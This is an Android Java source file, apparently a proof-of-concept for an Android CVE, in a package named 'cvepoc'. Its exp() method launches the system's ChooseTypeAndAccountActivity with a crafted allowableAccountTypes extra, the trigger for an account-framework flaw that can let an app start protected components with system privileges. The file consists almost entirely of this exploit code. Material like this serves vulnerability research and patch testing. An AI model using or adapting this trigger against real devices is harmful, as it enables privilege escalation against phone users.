package com.cnzzh.cvepoc;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void exp(View view) throws Exception {
        startActivity(new Intent ()
                .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
                .putExtra("allowableAccountTypes", new String[] {"com.cnzzh.cvepoc.account"})
        );
    }
}
